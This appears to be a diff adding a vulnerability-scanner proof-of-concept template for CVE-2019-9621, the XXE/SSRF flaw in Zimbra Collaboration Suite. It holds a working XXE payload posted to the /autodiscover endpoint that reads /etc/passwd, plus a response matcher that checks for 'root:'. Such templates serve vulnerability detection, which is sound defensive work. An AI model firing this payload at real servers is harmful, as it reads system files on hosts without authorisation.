@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "通过向 /autodiscover 接口发送包含 XXE 载荷的 POST 请求，检测 Zimbra Collaboration Suite 的 XML 外部实体注入漏洞。若响应中包含 /etc/passwd 文件内容则存在漏洞。"
+id = "POC-AVE-2019-1683"
+name = "Zimbra Collaboration Suite SSRF/XXE PoC"
+severity = "high"
+tags = [
+    "cve-2019-9621",
+    "zimbra",
+    "xxe",
+    "ssrf",
+]
+vuln_id = [
+    "CVE-2019-9621",
+    "AVE-2019-1683",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/autodiscover"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0"?>
+<!DOCTYPE soap [
+<!ELEMENT soap ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<Autodiscover>
+  <Request>
+    <EMailAddress>test@example.com</EMailAddress>
+    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
+  </Request>
+</Autodiscover>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "response schema",
+]
